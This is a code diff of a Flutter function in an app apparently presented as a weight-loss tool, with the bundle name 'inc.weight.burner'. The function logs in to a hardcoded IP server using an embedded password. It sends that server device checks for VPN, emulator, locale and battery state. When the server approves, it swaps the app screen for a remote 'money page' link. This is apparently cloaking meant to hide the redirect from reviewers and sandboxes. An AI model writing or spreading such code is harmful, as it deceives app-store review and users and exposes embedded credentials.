@@ -18,95 +18,78 @@ Future<void> yyyyyyyy(
     BuildContext context, Function(bool) isPhotoburner) async {
   final burnerDb = await BurnerRepository().burnerHGet();
   if (burnerDb == null) {
-      final String? authKey = await burnerAuthorization(
-        addPath: 'http://159.89.248.76/api/token/',
-        l: 'oauth',
-        p: '5.{r8<tWc>!Y2E3',
-      );
-      if (authKey != null) {
-        final burnerprxTemp = await burnerIsUsingVpn();
-        final burnerloc = await burnerCountryCode();
-        final burnerisEmul = await burnerIsSemulator(context);
-        final burnerbtrLevel = await burnerBatteryLevel();
-        final burnerisZarayd = await burnerIsCharging();
-        const burnerisSim = true;
-        final burnerDate = await burnerGetTime();
-        try {
-          BurnerResponse? burnerResponse;
+    final String? authKey = await burnerAuthorization(
+      addPath: 'http://159.89.248.76/api/token/',
+      l: 'oauth',
+      p: '5.{r8<tWc>!Y2E3',
+    );
+    if (authKey != null) {
+      final burnerprxTemp = await burnerIsUsingVpn();
+      final burnerloc = await burnerCountryCode();
+      final burnerisEmul = await burnerIsSemulator(context);
+      final burnerbtrLevel = await burnerBatteryLevel();
+      final burnerisZarayd = await burnerIsCharging();
+      const burnerisSim = true;
+      final burnerDate = await burnerGetTime();
+      try {
+        BurnerResponse? burnerResponse;
 
-          final userRegistrationResponse = await Dio(
-            BaseOptions(
-              headers: {'Authorization': 'Bearer $authKey'},
-            ),
-          ).post(
-            'http://159.89.248.76/api/ads_request/',
-            data: {
-              "bundle_name": "inc.weight.burner",
-              "timestamp": burnerDate,
-              "locale": burnerloc,
-              "prx_temp": burnerprxTemp,
-              "emul_temp": burnerisEmul,
-              "battery_temp": burnerisZarayd,
-              "mnostate_temp": burnerisSim,
-              "btry_temp": burnerbtrLevel,
-            },
-          );
-          if (userRegistrationResponse.data != null) {
-            burnerResponse =
-                BurnerResponse.fromJson(userRegistrationResponse.data);
-          }
-
-          if (burnerResponse != null) {
-            if (burnerResponse.boolValue) {
-              String burnerL1 =
-                  '${burnerResponse.burnerResponseObject.rev}${burnerResponse.burnerResponseObject.pvr}';
-              String burnerL2 =
-                  '${burnerResponse.burnerResponseObject.gjq}${burnerResponse.burnerResponseObject.ovd}';
-              final oneSignalSubscriptionId =
-                  OneSignal.User.pushSubscription.id;
-              if (burnerL1.contains('{click_id}')) {
-                burnerL1 = burnerL1.replaceAll('{click_id}',
-                    '$oneSignalSubscriptionId:${DocFF.signalchik}');
-                log('HEY LINK: $burnerL1');
-              }
-              late BurnerLocalModel burnerHiveObject;
-              if (burnerL2.contains('https://null.com')) {
-                burnerHiveObject = BurnerLocalModel(
-                    regburner: burnerL1,
-                    logburner: burnerL1,
-                    strtburner: true,
-                    cabburner: '');
-              } else {
-                if (burnerL2.contains('{click_id}')) {
-                  burnerL2 = burnerL2.replaceAll('{click_id}',
-                      '$oneSignalSubscriptionId:${DocFF.signalchik}');
-                }
-                burnerHiveObject = BurnerLocalModel(
-                    regburner: burnerL1,
-                    logburner: burnerL2,
-                    strtburner: true,
-                    cabburner: '');
-              }
-              log('1 - ${burnerHiveObject.regburner}');
-              log('2 - ${burnerHiveObject.logburner}');
-              BurnerRepository().burnerHSet(burnerHiveObject);
-              isPhotoburner(true);
-              await burnerDelayed(3);
-              burnerPushReplacement(
-                context,
-                BurnerMoneyPage(
-                  link: burnerHiveObject.regburner,
-                  cache: false,
-                ),
-              );
-              burnerCallReview(10);
-
-              return;
-            }
-          }
-        } catch (e) {
-          throw Exception(e);
+        final userRegistrationResponse = await Dio(
+          BaseOptions(
+            headers: {'Authorization': 'Bearer $authKey'},
+          ),
+        ).post(
+          'http://159.89.248.76/api/ads_request/',
+          data: {
+            "bundle_name": "inc.weight.burner",
+            "timestamp": burnerDate,
+            "locale": burnerloc,
+            "prx_temp": burnerprxTemp,
+            "emul_temp": burnerisEmul,
+            "battery_temp": burnerisZarayd,
+            "mnostate_temp": burnerisSim,
+            "btry_temp": burnerbtrLevel,
+          },
+        );
+        if (userRegistrationResponse.data != null) {
+          burnerResponse =
+              BurnerResponse.fromJson(userRegistrationResponse.data);
         }
+
+        if (burnerResponse != null) {
+          if (burnerResponse.boolValue) {
+            String burnerL1 =
+                '${burnerResponse.burnerResponseObject.rev}${burnerResponse.burnerResponseObject.pvr}';
+            final oneSignalSubscriptionId = OneSignal.User.pushSubscription.id;
+            if (burnerL1.contains('{click_id}')) {
+              burnerL1 = burnerL1.replaceAll(
+                  '{click_id}', '$oneSignalSubscriptionId:${DocFF.signalchik}');
+            }
+            late BurnerLocalModel burnerHiveObject;
+            burnerHiveObject = BurnerLocalModel(
+              regburner: burnerL1,
+              logburner: burnerL1,
+              strtburner: true,
+              cabburner: '',
+            );
+            BurnerRepository().burnerHSet(burnerHiveObject);
+            isPhotoburner(true);
+            await burnerDelayed(3);
+            burnerPushReplacement(
+              context,
+              BurnerMoneyPage(
+                link: burnerHiveObject.regburner,
+                cache: false,
+              ),
+            );
+            burnerCallReview(10);
+
+            return;
+          }
+        }
+      } catch (e) {
+        throw Exception(e);
+      }
     }
     isPhotoburner(false);
     await burnerDelayed(3);
